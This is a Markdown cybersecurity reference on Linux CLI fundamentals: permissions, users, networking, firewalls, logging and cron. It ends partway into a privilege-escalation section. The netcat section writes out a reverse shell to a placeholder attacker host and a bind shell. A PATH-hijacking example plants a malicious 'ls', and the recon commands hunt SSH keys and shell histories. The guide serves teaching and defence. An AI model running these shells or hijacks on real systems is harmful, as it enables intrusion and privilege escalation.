# Linux CLI Basics for Cybersecurity

A comprehensive reference covering Linux command-line fundamentals, file system, user management, networking, process management, permissions, shell scripting, and security-relevant techniques — from foundational concepts to advanced topics used in penetration testing, hardening, and incident response.

---

## 1. Linux Architecture

### Kernel & User Space

```
┌─────────────────────────────────────────────┐
│               User Space                     │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐  │
│  │  Shell   │  │  Tools   │  │   Apps    │  │
│  │(bash/zsh)│  │(ls,grep) │  │(nginx,ssh)│  │
│  └────┬─────┘  └────┬─────┘  └─────┬─────┘  │
├───────┼─────────────┼──────────────┼─────────┤
│       │          Kernel Space       │         │
│  ┌────▼─────────────▼──────────────▼──────┐  │
│  │           System Call Interface        │  │
│  ├────────────────────────────────────────┤  │
│  │  Process Mgmt │ Memory Mgmt │ VFS      │  │
│  │  Networking   │ Drivers     │ Security │  │
│  └────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────┐  │
│  │            Hardware                    │  │
└──┴────────────────────────────────────────┴──┘
```

### Distributions Relevant to Security

| Distro | Use Case |
|--------|---------|
| **Kali Linux** | Penetration testing; pre-loaded offensive tools |
| **Parrot OS** | Lightweight pen-test / privacy distro |
| **Ubuntu / Debian** | Common server OS; hardening target |
| **CentOS / RHEL / Rocky** | Enterprise server; SELinux-heavy |
| **Alpine Linux** | Minimal containers; reduced attack surface |
| **Arch Linux** | Rolling release; used in advanced setups |

---

## 2. Shell Basics

### Common Shells

| Shell | Binary | Notes |
|-------|--------|-------|
| Bash | `/bin/bash` | Most common; default on most distros |
| Zsh | `/bin/zsh` | Extended Bash; default on macOS |
| Sh | `/bin/sh` | POSIX shell; minimal |
| Fish | `/usr/bin/fish` | User-friendly; not POSIX-compatible |
| Dash | `/bin/dash` | Fast; used as `/bin/sh` on Debian/Ubuntu |

### Shell Configuration Files

| File | Scope | Loaded When |
|------|-------|------------|
| `/etc/profile` | Global | Login shell |
| `/etc/bash.bashrc` | Global | Interactive non-login shell |
| `~/.bash_profile` | User | Login shell |
| `~/.bashrc` | User | Interactive non-login shell |
| `~/.bash_logout` | User | On logout |
| `~/.zshrc` | User (Zsh) | Interactive shell |

**Security note:** Attackers modify `.bashrc`, `.bash_profile`, or `/etc/profile` for persistence.

### Basic Shell Syntax

```bash
# Run a command
ls -la /tmp

# Chain commands (run second only if first succeeds)
mkdir /tmp/test && cd /tmp/test

# Chain commands (run second regardless)
command1 ; command2

# Run second if first FAILS
command1 || command2

# Pipe output to next command
ps aux | grep sshd

# Redirect stdout to file (overwrite)
echo "hello" > file.txt

# Redirect stdout to file (append)
echo "hello" >> file.txt

# Redirect stderr to file
command 2> error.log

# Redirect both stdout and stderr
command > output.log 2>&1

# Discard output
command > /dev/null 2>&1

# Run in background
./script.sh &

# Subshell
result=$(whoami)
echo $result
```

### Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+C` | Kill foreground process |
| `Ctrl+Z` | Suspend foreground process |
| `Ctrl+D` | Send EOF / logout |
| `Ctrl+L` | Clear screen |
| `Ctrl+A` | Move to beginning of line |
| `Ctrl+E` | Move to end of line |
| `Ctrl+R` | Reverse history search |
| `!!` | Repeat last command |
| `!$` | Last argument of previous command |
| `sudo !!` | Re-run last command as sudo |

---

## 3. File System

### Linux Directory Structure (FHS)

| Directory | Purpose |
|-----------|---------|
| `/` | Root of the filesystem |
| `/bin` | Essential user binaries (`ls`, `cp`, `bash`) |
| `/sbin` | System administration binaries (`iptables`, `fdisk`) |
| `/usr/bin` | Non-essential user binaries |
| `/usr/sbin` | Non-essential system binaries |
| `/etc` | System-wide configuration files |
| `/home` | User home directories |
| `/root` | Root user's home directory |
| `/tmp` | Temporary files; world-writable; cleared on reboot |
| `/var` | Variable data (logs, spool, databases) |
| `/var/log` | System and application logs |
| `/proc` | Virtual FS; kernel and process info |
| `/sys` | Virtual FS; hardware and kernel parameters |
| `/dev` | Device files |
| `/lib` / `/lib64` | Shared libraries |
| `/opt` | Optional/third-party software |
| `/mnt` | Mount points for temporary mounts |
| `/media` | Mount points for removable media |
| `/boot` | Bootloader and kernel files |
| `/run` | Runtime data (PIDs, sockets) |

### Navigation Commands

```bash
# Print working directory
pwd

# List files
ls
ls -l          # long format
ls -la         # include hidden files
ls -lh         # human-readable sizes
ls -lt         # sort by modification time
ls -lR         # recursive

# Change directory
cd /etc
cd ~           # home directory
cd -           # previous directory
cd ..          # parent directory

# Find files
find / -name "passwd" 2>/dev/null
find /home -type f -name "*.sh"
find /tmp -mtime -1          # modified in last 24 hours
find / -perm -4000 2>/dev/null   # SUID files
find / -perm -2000 2>/dev/null   # SGID files
find / -writable -type d 2>/dev/null  # world-writable directories

# Locate files (uses database; faster than find)
locate passwd
updatedb       # update locate database
```

### File Operations

```bash
# Create files/directories
touch file.txt
mkdir directory
mkdir -p /path/to/nested/dir

# Copy
cp file.txt backup.txt
cp -r dir/ backup_dir/

# Move / rename
mv file.txt newname.txt
mv file.txt /tmp/

# Delete
rm file.txt
rm -rf directory/     # recursive force (dangerous)

# Create symlinks
ln -s /path/to/original link_name

# View file contents
cat file.txt
less file.txt          # paginated
head -n 20 file.txt    # first 20 lines
tail -n 20 file.txt    # last 20 lines
tail -f /var/log/syslog  # follow live

# File type
file binary_or_text

# Word / line count
wc -l file.txt
wc -w file.txt

# Compare files
diff file1.txt file2.txt
```

---

## 4. File Permissions

### Permission Model

Every file has three permission sets: **owner**, **group**, **others**.

```
-rwxr-xr--  1  alice  devs  4096  May 10 12:00  script.sh
│└──┴──┴──┘     │      │
│  u  g  o      │      └─ group
│               └─ owner
└─ file type (- file, d dir, l symlink, b block, c char)
```

### Permission Bits

| Symbol | Octal | Meaning |
|--------|-------|---------|
| `r` | 4 | Read |
| `w` | 2 | Write |
| `x` | 1 | Execute |
| `-` | 0 | No permission |

Common combinations:

| Octal | Symbolic | Meaning |
|-------|----------|---------|
| 777 | `rwxrwxrwx` | Full access for everyone |
| 755 | `rwxr-xr-x` | Owner full; others read/execute |
| 644 | `rw-r--r--` | Owner read/write; others read |
| 600 | `rw-------` | Owner read/write only |
| 700 | `rwx------` | Owner full; others nothing |
| 400 | `r--------` | Owner read only |

### Changing Permissions

```bash
# Symbolic
chmod u+x script.sh        # add execute for owner
chmod g-w file.txt         # remove write for group
chmod o=r file.txt         # set others to read only
chmod a+x script.sh        # add execute for all

# Numeric
chmod 755 script.sh
chmod 600 ~/.ssh/id_rsa

# Recursive
chmod -R 644 /var/www/html/

# Change owner
chown alice file.txt
chown alice:devs file.txt
chown -R www-data:www-data /var/www/

# Change group
chgrp devs file.txt
```

### Special Permission Bits

| Bit | Octal | Applied to | Effect |
|-----|-------|-----------|--------|
| **SUID** | 4000 | Executable | Runs as file owner, not caller |
| **SGID** | 2000 | Executable | Runs as file's group |
| **SGID** | 2000 | Directory | New files inherit directory's group |
| **Sticky** | 1000 | Directory | Only owner can delete their own files |

```bash
# Set SUID
chmod u+s /usr/bin/program
chmod 4755 /usr/bin/program

# Set sticky bit on directory
chmod +t /tmp
chmod 1777 /tmp

# Find all SUID binaries (privesc hunting)
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

**Security note:** SUID binaries run as their owner (often root). A misconfigured or vulnerable SUID binary is a classic privilege escalation vector.

### umask

`umask` defines default permissions for newly created files/directories.

```bash
# View current umask
umask

# Common values
# 022 → files: 644, dirs: 755 (default)
# 027 → files: 640, dirs: 750 (more restrictive)
# 077 → files: 600, dirs: 700 (most restrictive)

# Set umask
umask 027
```

---

## 5. Users & Groups

### User Information Files

| File | Contents |
|------|---------|
| `/etc/passwd` | User accounts (username, UID, GID, home, shell) |
| `/etc/shadow` | Hashed passwords and aging info (root-only) |
| `/etc/group` | Group definitions |
| `/etc/gshadow` | Secure group info |
| `/etc/sudoers` | Sudo configuration |

### `/etc/passwd` Format

```
username:x:UID:GID:comment:home:shell
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001:Alice:/home/alice:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

- `x` in password field means hash is in `/etc/shadow`
- `/usr/sbin/nologin` or `/bin/false` — no interactive login

### `/etc/shadow` Format

```
username:$type$salt$hash:lastchange:min:max:warn:inactive:expire
alice:$6$salt$hash...:19000:0:99999:7:::
```

Hash types:
- `$1$` — MD5 (weak)
- `$5$` — SHA-256
- `$6$` — SHA-512 (current standard)
- `$y$` — yescrypt (modern)

### User Management

```bash
# Add user
useradd -m -s /bin/bash alice
useradd -m -G sudo,www-data -s /bin/bash alice

# Set password
passwd alice

# Modify user
usermod -aG sudo alice       # add to sudo group
usermod -s /bin/bash alice   # change shell
usermod -L alice             # lock account
usermod -U alice             # unlock account

# Delete user
userdel alice
userdel -r alice             # remove home directory too

# View user info
id alice
id                           # current user
groups alice

# Switch user
su alice
su - alice                   # login shell (loads profile)
sudo -u alice command        # run command as alice

# Current user info
whoami
who                          # logged-in users
w                            # who + what they're doing
last                         # login history
lastlog                      # last login per user
lastb                        # failed login attempts
```

### Group Management

```bash
# Add group
groupadd developers

# Add user to group
usermod -aG developers alice
gpasswd -a alice developers

# Remove user from group
gpasswd -d alice developers

# View groups
getent group
cat /etc/group

# Create file as specific group
newgrp developers
```

### sudo

`sudo` allows users to run commands as another user (usually root), controlled by `/etc/sudoers`.

```bash
# Run command as root
sudo apt update

# Run command as specific user
sudo -u postgres psql

# Open root shell
sudo -i
sudo su -

# Edit sudoers safely
visudo

# View sudo privileges
sudo -l

# Run last command with sudo
sudo !!
```

**`/etc/sudoers` entries:**

```
# Allow alice to run all commands
alice  ALL=(ALL:ALL) ALL

# Allow alice to run specific commands without password
alice  ALL=(ALL) NOPASSWD: /usr/bin/apt, /usr/bin/systemctl

# Allow group to run all commands
%sudo  ALL=(ALL:ALL) ALL
```

**Security note:** `sudo -l` is one of the first commands run during privilege escalation reconnaissance.

---

## 6. Processes

### Process Concepts

Every process has:
- **PID** – Process ID
- **PPID** – Parent Process ID
- **UID/GID** – Owner/group
- **Nice value** – Scheduling priority (-20 highest, 19 lowest)

### Process Commands

```bash
# Snapshot of running processes
ps aux
ps -ef

# Process tree
ps auxf
pstree
pstree -p         # show PIDs

# Real-time process monitor
top
htop              # enhanced; may need install

# Find process by name
pgrep sshd
pidof sshd

# Send signal to process
kill PID
kill -9 PID       # SIGKILL; force terminate
kill -15 PID      # SIGTERM; graceful terminate
pkill process_name
killall process_name

# Background / foreground
command &         # start in background
jobs              # list background jobs
fg %1             # bring job 1 to foreground
bg %1             # resume job 1 in background
Ctrl+Z            # suspend current process
nohup command &   # run immune to hangup
```

### Process Signals

| Signal | Number | Description |
|--------|--------|-------------|
| SIGHUP | 1 | Hangup; reload config |
| SIGINT | 2 | Interrupt (Ctrl+C) |
| SIGKILL | 9 | Force kill; cannot be caught |
| SIGTERM | 15 | Graceful termination |
| SIGSTOP | 19 | Pause process; cannot be caught |
| SIGCONT | 18 | Resume paused process |

### `/proc` Filesystem

```bash
# Process info
cat /proc/<PID>/cmdline     # command line
cat /proc/<PID>/status      # status, UID, GID
cat /proc/<PID>/maps        # memory mappings
cat /proc/<PID>/fd/         # open file descriptors
ls -la /proc/<PID>/exe      # symlink to executable

# System info
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/version
cat /proc/net/tcp            # TCP connections
cat /proc/net/arp            # ARP table
```

---

## 7. Text Processing

Text processing is core to Linux security work — parsing logs, finding patterns, extracting IOCs.

### grep

```bash
# Basic search
grep "error" /var/log/syslog

# Case-insensitive
grep -i "failed" auth.log

# Invert match
grep -v "^#" /etc/ssh/sshd_config     # exclude comments

# Recursive search in directory
grep -r "password" /etc/

# Show line numbers
grep -n "root" /etc/passwd

# Show N lines before/after match
grep -B 3 -A 3 "error" log.txt

# Extended regex
grep -E "error|warning|critical" syslog

# Count matches
grep -c "Failed" auth.log

# Only print matching part
grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" log.txt   # extract IPs

# Quiet (exit code only; useful in scripts)
grep -q "pattern" file && echo "found"
```

### sed

Stream editor — find and replace, delete lines, transform text.

```bash
# Replace first occurrence per line
sed 's/old/new/' file.txt

# Replace all occurrences
sed 's/old/new/g' file.txt

# In-place edit
sed -i 's/old/new/g' file.txt

# Delete lines matching pattern
sed '/^#/d' file.txt        # delete comment lines
sed '/^$/d' file.txt        # delete blank lines

# Print specific lines
sed -n '10,20p' file.txt    # lines 10 to 20

# Append after matching line
sed '/\[SSH\]/a Port = 2222' sshd_config
```

### awk

Pattern scanning and data extraction.

```bash
# Print specific columns
awk '{print $1, $3}' file.txt

# Print column from colon-delimited file
awk -F: '{print $1}' /etc/passwd       # usernames
awk -F: '{print $1, $3}' /etc/passwd   # username and UID

# Filter rows by condition
awk -F: '$3 == 0 {print $1}' /etc/passwd   # UID 0 accounts
awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # regular users

# Sum a column
awk '{sum += $5} END {print sum}' file.txt

# Print lines matching pattern
awk '/Failed/' /var/log/auth.log
```

### cut, sort, uniq

```bash
# Extract fields
cut -d: -f1 /etc/passwd          # first field, colon delimiter
cut -d' ' -f1-3 file.txt         # first three space-delimited fields

# Sort
sort file.txt
sort -n numbers.txt              # numeric sort
sort -r file.txt                 # reverse
sort -k2 file.txt                # sort by column 2
sort -t: -k3 -n /etc/passwd      # sort passwd by UID

# Unique (must be sorted first)
sort file.txt | uniq
sort file.txt | uniq -c          # count occurrences
sort file.txt | uniq -d          # only duplicates

# Common log analysis pattern: top IPs from access log
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20
```

### Other Useful Tools

```bash
# tr - translate/delete characters
echo "Hello World" | tr '[:upper:]' '[:lower:]'
cat file.txt | tr -d '\r'        # remove Windows carriage returns

# xargs - build commands from stdin
find /tmp -name "*.sh" | xargs rm
cat ips.txt | xargs -I{} ping -c 1 {}

# tee - write to file AND stdout
command | tee output.txt

# strings - extract printable strings from binary
strings /usr/bin/passwd | grep -i pass

# xxd - hex dump
xxd binary_file | head -20
echo -n "hello" | xxd

# base64
echo "hello" | base64
echo "aGVsbG8=" | base64 -d

# md5sum / sha256sum
md5sum file.txt
sha256sum file.txt
sha256sum -c checksums.txt       # verify
```

---

## 8. Networking

### Network Configuration Commands

```bash
# IP addresses and interfaces
ip addr show
ip addr show eth0
ifconfig           # legacy

# Routing table
ip route show
route -n           # legacy

# DNS servers
cat /etc/resolv.conf

# Hostname
hostname
hostname -f        # FQDN

# ARP table
ip neigh
arp -a

# Network interfaces up/down
ip link set eth0 up
ip link set eth0 down
```

### Connectivity Testing

```bash
# Ping
ping -c 4 google.com

# Traceroute
traceroute google.com
tracepath google.com

# DNS lookup
nslookup example.com
dig example.com
dig example.com A
dig example.com MX
dig @8.8.8.8 example.com       # use specific DNS server
dig -x 8.8.8.8                 # reverse DNS

# Check if port is open
nc -zv 192.168.1.1 22
nc -zvw3 192.168.1.1 22        # 3 second timeout
telnet 192.168.1.1 22

# Curl / wget
curl http://example.com
curl -I http://example.com     # headers only
curl -L -o file.zip http://example.com/file.zip
wget http://example.com/file
```

### Active Connections & Listening Ports

```bash
# All connections and listening ports
ss -tuln
ss -tunap          # include process names (requires sudo)
netstat -tuln      # legacy
netstat -tunap     # legacy with processes

# Listening ports only
ss -tlnp
netstat -tlnp

# Established connections
ss -tnp state established

# Key fields in ss output
# Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
# tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*
```

**Security note:** Regularly audit listening ports. Unknown listeners are indicators of compromise or misconfiguration.

### Netcat (nc)

Netcat is the "Swiss army knife" of networking — used for testing, file transfer, and shells.

```bash
# Connect to a port
nc 192.168.1.1 80

# Listen on a port
nc -lvp 4444

# Transfer a file
# Receiver:
nc -lvp 4444 > received_file
# Sender:
nc 192.168.1.2 4444 < file_to_send

# Simple HTTP request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# Reverse shell (attacker listener)
nc -lvp 4444
# Victim:
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Bind shell listener
nc -lvp 4444 -e /bin/bash
```

### SSH

```bash
# Connect
ssh user@host
ssh -p 2222 user@host          # custom port
ssh -i ~/.ssh/key.pem user@host  # with key

# Generate SSH key pair
ssh-keygen -t ed25519 -C "comment"
ssh-keygen -t rsa -b 4096

# Copy public key to server
ssh-copy-id user@host

# SSH tunneling (port forwarding)
# Local forward: access remote_host:3306 via localhost:3306
ssh -L 3306:remote_host:3306 user@jumphost

# Remote forward: expose local:8080 on remote:80
ssh -R 80:localhost:8080 user@remote

# Dynamic forward (SOCKS proxy)
ssh -D 1080 user@host

# Execute command without interactive shell
ssh user@host "ls -la /tmp"

# SCP file transfer
scp file.txt user@host:/tmp/
scp user@host:/tmp/file.txt .
scp -r dir/ user@host:/tmp/

# SFTP
sftp user@host
```

### SSH Hardening (`/etc/ssh/sshd_config`)

```bash
Port 2222                         # Non-standard port
PermitRootLogin no                # Disable root SSH
PasswordAuthentication no         # Key-based auth only
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
PermitEmptyPasswords no
X11Forwarding no
MaxAuthTries 3
LoginGraceTime 30
AllowUsers alice bob              # Whitelist users
ClientAliveInterval 300
ClientAliveCountMax 2
Protocol 2                        # SSHv2 only
```

---

## 9. Firewall & iptables

### iptables

The traditional Linux firewall tool. Rules are processed top-to-bottom; first match wins.

**Chains:**
- `INPUT` — Incoming traffic to the host
- `OUTPUT` — Outgoing traffic from the host
- `FORWARD` — Traffic passing through the host

```bash
# View rules
iptables -L -n -v
iptables -L -n -v --line-numbers

# Flush all rules (careful!)
iptables -F

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Block an IP
iptables -A INPUT -s 192.168.1.100 -j DROP

# Allow from specific IP
iptables -A INPUT -s 192.168.1.10 -p tcp --dport 22 -j ACCEPT

# Rate limit (basic brute-force protection)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP

# Save and restore rules
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4
```

### nftables (Modern Replacement)

```bash
# List all rules
nft list ruleset

# Add a table
nft add table inet filter

# Add a chain
nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }

# Add a rule
nft add rule inet filter input tcp dport 22 accept
nft add rule inet filter input ct state established,related accept
```

### UFW (Uncomplicated Firewall)

Friendly frontend for iptables, common on Ubuntu:

```bash
# Enable/disable
ufw enable
ufw disable
ufw status verbose

# Allow/deny
ufw allow 22/tcp
ufw allow from 192.168.1.0/24 to any port 22
ufw deny 23/tcp
ufw delete allow 22/tcp

# Default policies
ufw default deny incoming
ufw default allow outgoing

# Application profiles
ufw app list
ufw allow OpenSSH
```

---

## 10. Services & Systemd

### systemctl

```bash
# Start / stop / restart / reload
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx

# Enable / disable at boot
systemctl enable nginx
systemctl disable nginx

# Check status
systemctl status nginx
systemctl is-active nginx
systemctl is-enabled nginx

# List all services
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl list-units --type=service --state=failed

# View unit file
systemctl cat nginx

# Reload systemd configuration
systemctl daemon-reload

# View service logs
journalctl -u nginx
journalctl -u nginx -f          # follow
journalctl -u nginx --since "1 hour ago"
journalctl -u nginx -n 50       # last 50 lines
```

### Service Unit File

```ini
[Unit]
Description=My Custom Service
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/start.sh
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

**Security note:** Check new/modified service unit files during incident response — common persistence location at `/etc/systemd/system/` and `/lib/systemd/system/`.

---

## 11. Package Management

### Debian / Ubuntu (apt)

```bash
# Update package list
apt update

# Upgrade packages
apt upgrade
apt full-upgrade

# Install
apt install package_name

# Remove
apt remove package_name
apt purge package_name     # also removes config files

# Search
apt search keyword

# Show package info
apt show package_name

# List installed packages
dpkg -l
dpkg -l | grep nginx

# Verify package integrity
dpkg -V package_name
```

### RHEL / CentOS / Rocky (dnf / yum)

```bash
# Update
dnf update

# Install
dnf install package_name

# Remove
dnf remove package_name

# Search
dnf search keyword

# List installed
rpm -qa
rpm -qa | grep nginx

# Verify package
rpm -V package_name

# Check which package owns a file
rpm -qf /usr/bin/ssh
dpkg -S /usr/bin/ssh   # Debian equivalent
```

**Security note:** `rpm -V` / `dpkg -V` checks installed files against their package metadata — useful for detecting tampered binaries.

---

## 12. Disk & Storage

```bash
# Disk usage
df -h                  # filesystem usage
du -sh /var/log/       # directory size
du -sh * | sort -h     # all items, sorted by size

# Partition info
lsblk
fdisk -l
parted -l

# Mount / unmount
mount /dev/sdb1 /mnt/usb
umount /mnt/usb

# Mounted filesystems
mount | column -t
cat /proc/mounts

# Find large files
find / -size +100M -type f 2>/dev/null

# Disk I/O activity
iostat -xz 1
iotop

# Check filesystem
fsck /dev/sda1

# Secure file deletion (overwrite)
shred -v -n 3 -z file.txt
```

---

## 13. Logs

### Key Log Files

| Log | Location | Contents |
|-----|----------|---------|
| Syslog | `/var/log/syslog` or `/var/log/messages` | General system events |
| Auth | `/var/log/auth.log` or `/var/log/secure` | Authentication, sudo, SSH |
| Kernel | `/var/log/kern.log` | Kernel messages |
| Boot | `/var/log/boot.log` | Boot process |
| Cron | `/var/log/cron.log` | Scheduled task execution |
| dpkg | `/var/log/dpkg.log` | Package install/remove |
| Apache | `/var/log/apache2/` | Web server access and errors |
| Nginx | `/var/log/nginx/` | Web server access and errors |
| Journal | `journalctl` | systemd unified log |
| Audit | `/var/log/audit/audit.log` | auditd events |
| Faillog | `/var/log/faillog` | Failed logins |
| wtmp | `/var/log/wtmp` | All login/logout history |
| btmp | `/var/log/btmp` | Failed login attempts |
| lastlog | `/var/log/lastlog` | Last login per user |

### Log Analysis Commands

```bash
# Follow live log
tail -f /var/log/syslog
journalctl -f

# Search for failures
grep -i "failed\|error\|denied" /var/log/auth.log

# Count failed SSH attempts by IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful SSH logins
grep "Accepted" /var/log/auth.log

# journalctl filters
journalctl -p err                      # errors and above
journalctl --since "2024-01-01" --until "2024-01-02"
journalctl _UID=1000                   # logs for specific user
journalctl -k                          # kernel messages only
journalctl -b                          # this boot
journalctl -b -1                       # previous boot

# wtmp / btmp (binary; use these tools)
last                     # login history
lastb                    # failed login attempts (requires root)
lastlog                  # last login per user
```

### auditd

The Linux Audit daemon provides fine-grained system call and file access logging.

```bash
# Install
apt install auditd

# Status
systemctl status auditd
auditctl -s

# List current rules
auditctl -l

# Watch a file for read/write
auditctl -w /etc/passwd -p rwa -k passwd_changes

# Watch a directory
auditctl -w /etc/sudoers.d/ -p wa -k sudoers_changes

# Audit all executions (performance impact)
auditctl -a always,exit -F arch=b64 -S execve -k exec_log

# Search audit log
ausearch -k passwd_changes
ausearch -m LOGIN --start today
ausearch -ua 0               # actions by root

# Generate report
aureport --summary
aureport --login
aureport --failed
```

---

## 14. Cron & Scheduled Tasks

### Crontab Syntax

```
# ┌───────── minute (0-59)
# │ ┌─────── hour (0-23)
# │ │ ┌───── day of month (1-31)
# │ │ │ ┌─── month (1-12)
# │ │ │ │ ┌─ day of week (0-7, 0 and 7 = Sunday)
# │ │ │ │ │
# * * * * *  command
```

Examples:

```bash
# Every minute
* * * * * /script.sh

# Every hour at minute 0
0 * * * * /script.sh

# Daily at 2:30 AM
30 2 * * * /script.sh

# Every Monday at 9 AM
0 9 * * 1 /script.sh

# Every 15 minutes
*/15 * * * * /script.sh

# First day of month at midnight
0 0 1 * * /script.sh
```

### Cron Commands

```bash
# Edit current user's crontab
crontab -e

# List crontab entries
crontab -l

# Edit another user's crontab (root)
crontab -u alice -e

# Remove crontab
crontab -r
```

### Cron Locations (Security Checklist)

```
/etc/crontab              # System crontab
/etc/cron.d/              # Drop-in cron files
/etc/cron.hourly/         # Scripts run hourly
/etc/cron.daily/          # Scripts run daily
/etc/cron.weekly/         # Scripts run weekly
/etc/cron.monthly/        # Scripts run monthly
/var/spool/cron/crontabs/ # Per-user crontabs
```

**Security note:** These are common persistence locations. Audit all cron entries during incident response.

---

## 15. Environment Variables

```bash
# View all environment variables
env
printenv

# View a specific variable
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Set a variable (current session only)
export MY_VAR="value"

# Set permanently (add to ~/.bashrc)
echo 'export MY_VAR="value"' >> ~/.bashrc
source ~/.bashrc

# Unset a variable
unset MY_VAR

# Run command with modified environment
env VAR=value command

# View PATH
echo $PATH | tr ':' '\n'
```

### Security-Relevant Variables

| Variable | Purpose | Security Note |
|----------|---------|--------------|
| `PATH` | Executable search order | If `.` or writable dirs come first, can hijack commands |
| `LD_PRELOAD` | Preload shared libraries | Can inject code into any process |
| `LD_LIBRARY_PATH` | Library search path | Can redirect library loading |
| `HISTFILE` | History file location | Set to `/dev/null` to disable history |
| `HISTSIZE` | Number of history entries | 0 disables history in memory |
| `PS1` | Shell prompt | Attackers may modify to obscure activity |

**Attack example — PATH hijacking:**

```bash
# If PATH starts with . or a writable dir
export PATH=.:$PATH

# Place malicious 'ls' in current directory
echo '#!/bin/bash
/bin/bash -p' > ls
chmod +x ls

# When admin runs 'ls', gets a shell
```

---

## 16. Shell Scripting for Security

### Script Basics

```bash
#!/bin/bash
# Script header - always specify interpreter

# Variables
NAME="Alice"
echo "Hello, $NAME"

# Command substitution
DATE=$(date +%Y-%m-%d)
USERS=$(cat /etc/passwd | wc -l)

# Conditionals
if [ -f /etc/passwd ]; then
    echo "File exists"
elif [ -d /etc/ ]; then
    echo "Directory exists"
else
    echo "Neither"
fi

# Comparison operators
# [ "$a" -eq "$b" ]   numeric equal
# [ "$a" -ne "$b" ]   numeric not equal
# [ "$a" -lt "$b" ]   less than
# [ "$a" -gt "$b" ]   greater than
# [ "$a" = "$b" ]     string equal
# [ -f "$file" ]      file exists and is regular file
# [ -d "$dir" ]       directory exists
# [ -r "$file" ]      file is readable
# [ -x "$file" ]      file is executable
# [ -z "$var" ]       variable is empty
# [ -n "$var" ]       variable is not empty

# Loops
for user in alice bob charlie; do
    echo "User: $user"
done

for file in /var/log/*.log; do
    echo "Processing: $file"
done

# C-style for loop
for ((i=1; i<=10; i++)); do
    echo $i
done

# While loop
while read line; do
    echo "$line"
done < /etc/passwd

# Functions
check_port() {
    local host=$1
    local port=$2
    nc -zw2 "$host" "$port" && echo "$port open" || echo "$port closed"
}
check_port 192.168.1.1 22

# Exit codes
command
if [ $? -eq 0 ]; then
    echo "Success"
fi
```

### Security Scripts

```bash
#!/bin/bash
# Quick security audit script

echo "=== System Info ==="
uname -a
cat /etc/os-release | head -3

echo ""
echo "=== Current User ==="
id
sudo -l 2>/dev/null

echo ""
echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "=== Writable Directories in PATH ==="
echo $PATH | tr ':' '\n' | while read dir; do
    [ -w "$dir" ] && echo "Writable: $dir"
done

echo ""
echo "=== Listening Ports ==="
ss -tlnp

echo ""
echo "=== Crontabs ==="
cat /etc/crontab 2>/dev/null
ls /etc/cron.d/ 2>/dev/null
crontab -l 2>/dev/null

echo ""
echo "=== World-Writable Files (outside /tmp/proc/sys) ==="
find / -writable -type f 2>/dev/null | grep -Ev "^/(proc|sys|tmp)"
```

---

## 17. File Archiving & Transfer

```bash
# tar - archive and compress
tar -cvf archive.tar dir/           # create archive
tar -czvf archive.tar.gz dir/       # create + gzip compress
tar -cjvf archive.tar.bz2 dir/      # create + bzip2 compress
tar -xvf archive.tar                # extract
tar -xzvf archive.tar.gz            # extract gzip
tar -xzvf archive.tar.gz -C /tmp/  # extract to directory
tar -tvf archive.tar                # list contents

# zip / unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip
unzip archive.zip -d /tmp/

# gzip / gunzip
gzip file.txt                   # creates file.txt.gz; removes original
gunzip file.txt.gz
gzip -k file.txt                # keep original

# File transfer
scp file.txt user@host:/path/
rsync -avz dir/ user@host:/path/
rsync -avz --delete dir/ user@host:/path/  # mirror

# Transfer with netcat (no SSH)
# Receiver
nc -lvp 4444 | tar -xzv
# Sender
tar -czv dir/ | nc receiver_ip 4444

# Python HTTP server (quick file server)
python3 -m http.server 8080
# Download from another machine
wget http://server_ip:8080/file.txt
curl -O http://server_ip:8080/file.txt
```

---

## 18. Privilege Escalation Techniques

### Reconnaissance Commands

```bash
# System info
uname -a
cat /etc/os-release
cat /proc/version

# Current user
id
whoami
sudo -l

# Users with shells
cat /etc/passwd | grep -v nologin | grep -v false
awk -F: '$7 != "/sbin/nologin" && $7 != "/bin/false" {print $1}' /etc/passwd

# Logged-in users
who
w

# Interesting files
find / -name "*.conf" -readable 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
find / -name "*.bak" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

# Network
ss -tuln
cat /etc/hosts
cat /etc/resolv.conf
```

### Common PrivEsc Vectors

**1. SUID/SGID Binaries**

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

